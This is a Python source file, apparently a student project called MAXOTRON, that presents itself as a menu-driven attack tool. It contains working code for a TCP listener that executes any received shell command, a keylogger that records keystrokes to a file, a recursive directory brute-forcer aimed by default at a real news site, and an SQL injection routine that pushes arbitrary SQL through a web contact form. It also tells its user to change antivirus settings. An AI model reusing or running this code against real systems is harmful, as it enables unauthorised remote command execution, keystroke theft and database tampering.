# Name: MAXOTRON_user_cllass.py
# Author: dipper
# Date: 1.6.2026
# Description:  this is an attacking tool for regstered users only.
#           tools:
#               - move the mouse radomly on the attacked computer 
#               - open a tcp socket and recive cmd commands
#               - recives a file path and returns a list with all its files 
#               - Dirbuster
#           for admins:
#               - keylogger for a destined file
#               - use SQLI on the whynet server and run commands on the DB
#
#               this code contains the class that contains users and their attacking tools
# imports
# login times
import shelve
from importlib.machinery import SourceFileLoader
# mouse attack
import win32api, msvcrt, pickle
import random, time, datetime
# tcp attack
import socket, subprocess 
# Dirbuster
import requests
# dir attack
import os
#keylogger

#import keylogger.py
import pynput
from pynput.keyboard import Listener
from pynput import keyboard

#sqli

import requests
from requests.auth import HTTPBasicAuth
import urllib.parse


# CONSTANTS
MAIN_MENU = ("""THIS IS THE MENU FOR THE ATTACK:
        0 -> EXIT
        1 -> MOUSE ATTACK
        2 -> TCP SOCKET
        3 -> DIR MAPPING
        4 -> dirbuster
        -IF U ARE ADMIN THEN:
        5 -> KEYLOGGER
        6 -> SQLI on whynet
        7 -> SWITCH USER
""")
USER_MENU = ("""LIST OF USERS
             1 -> RALF
             2 -> JOHN SNOW
             3 -> eugene 
             """)
DUCK_FILE = r"C:\dipper\my_first_repo\tichnut\python\final projet MAXOTRON-3000 py\static_dlls\ASCII_DUCK.txt"
# for tcp attack
BYTES_RECIVED = 1024
DECODE_TYPE = "utf-8"
# dirbuster
DOMAIN_IP = r"https://www.ynet.co.il"
GOOD_STATUSE_CODE = 200
#keylogger file
#hey linor please change this path so it'll work
PATH = "keylogger_file.txt"
#sqli
GOOD_STATUSE_CODE = 200
SQLI_MESSAGE = r"'); ALTER TABLE dbo.CotactUs ADD Ne"
USER_COMMAND_MESSAGE = "enter wanted SQL command (exit to exit), [example query: ALTER TABLE dbo.ContactUs ADD NewNew int; ]\n"
burp0_headers = {"Accept-Language": "en-US,en;q=0.9", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Referer": "http://www.whynet.com/contact.php", "Accept-Encoding": "gzip, deflate, br", "Connection": "keep-alive"}


def get_set_last_login(user, path_last_logins):
    """
    this func recives a user object andu path_last_logins
    this func returns nothing just prints user last login
    and updates it to a file
    """

    # make a list of users times
    with open(path_last_logins, 'r') as file:
        last_logins_list = file.read().splitlines()

    # print last time and update
    match user.user_name:
        case "ralf":
            print (f"ralf's last login -> {last_logins_list[0]}")
            last_logins_list[0] = (f"{datetime.datetime.now()}")
        case "john":
            print (f"john's last login -> {last_logins_list[1]}")
            last_logins_list[1] = (f"{datetime.datetime.now()}")
        case "eugene":
            print (f"eugene's last login -> {last_logins_list[2]}")
            last_logins_list[2] = (f"{datetime.datetime.now()}")
    with open(path_last_logins, 'w') as file:
        file.write(f"{last_logins_list[0]}\n{last_logins_list[1]}\n{last_logins_list[2]}" )
    user.last_login = datetime.datetime.now()


def random_xy():
    """
    mouse attack: this function generates random 
    x & y places on the screen and returns 2 x_cordinates
    """

    x_cordinate = random.randint(0, 1920)
    y_cordinate = random.randint(0, 1080)
    return x_cordinate, y_cordinate


def list_files(path):
        """
        dir attack recursion func
        """

        all_objects = os.listdir((path))

        # will contain all the files in the current dir
        temp_files_list = []

        # will contain all the folders in the current dir
        temp_folder_list = []
        files_list = []
        temp_path = ""

        # lists only files and ignores folders inside a directory
        for object in all_objects:
            temp_path = path + "\\" + object
            if os.path.isfile(temp_path):

                # add to list the files in the directory
                temp_files_list.append(object)
        files_list = temp_files_list
        

        # find all the folders in current dir
        for folder in all_objects:
            temp_path_dir = path + "\\" + folder
            if os.path.isdir(temp_path_dir):
                temp_folder_list.append(folder) 

        # run throughout the directories in the folder
        for dir in temp_folder_list:

            temp_path = path + "\\" + dir
            files_list.append(list_files(temp_path))

        return files_list



def requesting (names, base_url):
    """
    Dirbuster attack recursion func
    this func takes all the names as list
    this function returns all the seccessfull url names and domain names
    """

    good_names = []
    current_url = ""
    for name in names:
        current_url = base_url + "/" + name
        response = requests.get(current_url)

        # is the statuse code 200
        if (response.status_code == GOOD_STATUSE_CODE):
            good_names.append(name)

            #is it a dir
            if (response.content != None):

                # doing recursion for directories
                good_names.append(requesting(names, current_url))
    return good_names


def on_press(key):
    """
    this function recives a key-object
    this function records to a file every keyboard press recorded by the user
    """

    with open(PATH, "a") as file:
        try:
            file.write(f"{key.char}")
            print(f"{key.char}")

        except AttributeError:
            if key == key.space:
                file.write("[SPACE]")
                print("[SPACE] ")

            elif key == key.enter:
                file.write("\n")
                print("\n")

            else:
                file.write(f"[{key}]")
                print(f"[{key}]")




class user:

    def __init__(self, full_name, user_name, hash_pass, last_login, admin):
        self.full_name = full_name
        self.user_name = user_name
        self.hash = hash(hash_pass)
        self.last_login = last_login
        self.admin = admin

    # print user description
    def __str__(self):
        descr = (f"""name: {self.full_name}  \nuser name: {self.user_name}\n"""
                 f"""hash: {self.hash}      \nlast login: {self.last_login}\n"""
                 f"""is admin: {self.admin}""")
        return f"""name:{self.full_name}\nuser name: {self.user_name}"""
    
    ##############################################################
    # NORMAL ATTACKS:

    #mouse attack
    def mouse(self):
        while 1:
            x_cordinate, y_cordinate = random_xy()
            if msvcrt.kbhit():
                if msvcrt.getch().lower() == b'q':
                    break
            win32api.mouse_event(1, x_cordinate, y_cordinate, 0)
            print ("x_cordinate-> ", x_cordinate,"\n", "y_cordinate-> ", y_cordinate)
            print ("to stop press q and wait")
            time.sleep(10)

    # open a tcp socket and recive cmd commands, run them locally
    #   recive ip and port
    def tcp_Connection(self, host, port):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
            server_socket.bind((host, port))
            server_socket.listen()
            connection, address = server_socket.accept()
            with connection:
                print(f"Connected by {address}")
                while True:
                    data = connection.recv(BYTES_RECIVED)

                    #convert bytes to string
                    data = data.decode(DECODE_TYPE) 

                    # if we receive close then close connection
                    if (data == "close"):
                        print(f"command: {data}")
                        break

                    #running the command
                    command = subprocess.run(data,shell=True ,capture_output=True, text=True)



                    # if we receive close then close connection
                    if (data == "close\r\n"):
                        print(f"close connection")
                        break                
                    print("Output:", command.stdout)

    # dir attack
    #   recives a file path and returns a list with all its files
    def dir_attack(self):
        path = input("enter a directory path: (like-> C:\dipper\pictures_of_dipper)\n").replace('"','')
        full_list = []
        full_list = list_files(path=path)
        print (f"finall list : \n {full_list}")

    #  Dirbuster
    def Dirbuster(self, user_path):

        names = []
        seccess = []
        # user_path = input("enter path to file with names to try\n like:"/
        #                 r"C:\dipper\my_first_repo\tichnut\python\ex_6"/
        #                 r"_py\common_files_names_ex6_py.txt" + "\n").replace('"','')
        domain_path = input("enter ip or url to attack (Dirbuster): (like -> https://www.ynet.co.il)\n")

        # check input
        user_path = user_path.replace('"', '')
        with open(user_path, "r") as file:
            for line in file:
                line = line.strip()
                names.append(line)
                url = domain_path + "/" + line
                seccess = requesting(names, domain_path)
        print (f"""\nall the fitting names (if they are in [] then """
            f"""they are from the dir of the name before them):\n{seccess}""")
        
    ############################################################
    # ADMIN ATTACKS

    # keylogger
    def keylogger_admin_func(self):
        # create output file if not existing
        print("outputs out to file named\n'keylogger_file.txt'" \
                "notice that if u write in the terminal you'll have to delete what u " \
                "wrote before preciding" \
                "beware not to press enter in the comand line" \
                "to exit press cntrl+c")
        file_path ="keylogger_file.txt"

        listener = keyboard.Listener(on_press=on_press)
        try:
            listener.start()
            listener.join()
        except KeyboardInterrupt:
            print("ctrl+c pressed")
            listener.stop()
            return None



    # sqli
    def sqli_attack(self):
        user_command,user_command_url = None, None

        print ("be ware to chnge virus and thret protection settings")

        user_command = input(USER_COMMAND_MESSAGE)
        user_command_url = urllib.parse.quote(user_command)

        # run through the list
        while (user_command != user_command.lower()):
            try:
                burp0_url_SQLI = (fr"http://www.whynet.com:80/AddToContact.php?Name=ee&Email=ee&Subject=ee&Message=%27%29%3B+{user_command_url}--")

                # makes a get request
                requests.get(burp0_url_SQLI, headers=burp0_headers)
                user_command = input(USER_COMMAND_MESSAGE)
                user_command_url = urllib.parse.quote(user_command)

            #in case of syntax error or somthing like it
            except:
                    print ("error acoured \ntry again")
        


# login func
# gets a user object and gets path_last_logins file path
# returns a bool confirmed
def login (name, path_last_logins, path_ascii_duck):
    """
    login func
    gets a user object and gets path_last_logins file path
    returns a bool confirmed
    """

    password = input(f"please enter {name.full_name} pass:\n")
    hashed_pass = hash(password)
    if name.hash == hashed_pass:

        #print user details
        print (name)

        # update last login time
        #name.last_login = datetime.datetime.now
        get_set_last_login(name, path_last_logins)

        # display duck if admin
        if (name.admin):
            with open(path_ascii_duck, 'r') as file:
                duck_ascii = file.read()
                print(duck_ascii)
        return True
    print("incorrect")
    return False

# authonticate user, gets path_last_logins file path
# returns the current user object
def authonticate_user(user_list, path_last_logins, path_ascii_duck):
    """
    authonticate user, gets path_last_logins file path
    returns the current user object
    """

    is_user = False
    temp_user = None
    ralf, john_snow, eugene = user_list[0], user_list[1], user_list[2]

    while (is_user == False):
        user_num = int(input(USER_MENU))
        match user_num:
            case 1:
                is_user = login(ralf, path_last_logins, path_ascii_duck)
                temp_user = ralf
            case 2:
                is_user = login(john_snow, path_last_logins, path_ascii_duck)
                temp_user = john_snow
            case 3:
                is_user = login(eugene, path_last_logins, path_ascii_duck)
                temp_user = eugene
            case _:
                print ("invalid")
    return temp_user




def main():

    #general variables
    cuurent_user = None
    host, port = None, None
    dependcies_files = ["common_files_names.txt",  "ASCII_DUCK.txt", "login_times.txt"]
    path_to_import_dir = input(f"enter path to import_dir:[should contain-> {dependcies_files}]\n").replace('"','')
    path_last_logins = (fr"{path_to_import_dir}\login_times.txt")
    path_ascii_duck = (fr"{path_to_import_dir}\ASCII_DUCK.txt")
    names_to_map_domain =  (fr"{path_to_import_dir}\common_files_names.txt")


    # path_last_logins = input("enter path to lastlogin file: like->\n"
    # r"C:\dipper\my_first_repo\tichnut\python\final projet MAXOTRON-3000 py\static_dlls\login_times.txt"+"\n").replace('"','')
    # path_ascii_duck = input("enter path to duck file: like->\n"
    # r"C:\dipper\my_first_repo\tichnut\python\final projet MAXOTRON-3000 py\static_dlls\ASCII_DUCK.txt"+"\n").replace('"','')
    

    # hardcoded global users
    #global ralf, john_snow, ujin
    ralf = user(full_name="Ralf the Destroyer", user_name="ralf",
                 hash_pass="Aa123", last_login=datetime.datetime.now, admin=True)
    john_snow = user(full_name="john_snow", user_name="john",
                 hash_pass="Aa123", last_login=datetime.datetime.now, admin=True)
    eugene = user(full_name="eugene", user_name="eugene",
                 hash_pass="Aa123", last_login=datetime.datetime.now, admin=False)
    user_list = [ralf, john_snow, eugene]

    cuurent_user = authonticate_user(user_list, path_last_logins, path_ascii_duck)
    if (cuurent_user == None):
        print("error")
        quit()

    choise = int(input(MAIN_MENU))
    #loop through options in the class and print the menu

    while(choise!=0):
        match choise:

            # mouse attack
            case 1:
                cuurent_user.mouse()

            # tcp attack
            case 2:
                host = input ("let us run some commands. enter the host ip:\n")
                port = int(input("enter the port:\n"))
                cuurent_user.tcp_Connection(host=host, port=port ) 

            # dir mapping attack
            case 3:
                cuurent_user.dir_attack()           

            # DIRBUSTER attack
            case 4:
                cuurent_user.Dirbuster(names_to_map_domain)

            # keylogger attack
            case 5:
                if (cuurent_user.admin):
                    cuurent_user.keylogger_admin_func()
                    time.sleep(1.5)
                else:
                    print ("u are not allowed to do that")
                

            # SQLI attack
            case 6:
                if (cuurent_user.admin):
                    cuurent_user.sqli_attack()
                else:
                    print ("u are not allowed to do that")

            # switch user
            case 7:
                cuurent_user = authonticate_user(user_list, path_last_logins, path_ascii_duck)

            case _ :
                print ("wrong input try again")
            
        choise = int(input(MAIN_MENU))


    input("been nice attackingwith u \nbye")






if __name__=="__main__":
    main()